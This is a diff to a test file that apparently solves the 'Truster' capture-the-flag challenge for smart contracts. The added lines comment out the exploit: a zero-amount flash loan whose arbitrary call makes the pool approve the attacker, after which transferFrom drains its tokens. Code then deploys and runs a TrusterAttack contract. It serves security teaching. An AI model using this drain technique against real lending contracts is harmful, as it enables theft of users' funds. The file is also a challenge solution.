@@ -29,6 +29,16 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        /*
+        Call flashLoan with borrowAmount=0 and target=token
+        In target.functionCall, call approve to let attacker spend pools tokens
+        Use transferFrom to transfer all tokens to the attacker
+        */
+        
+       const AttackFactory = await ethers.getContractFactory("TrusterAttack", attacker)
+       const attackContract = await AttackFactory.deploy(this.pool.address, this.token.address)
+
+       await attackContract.attack()
     });
 
     after(async function () {
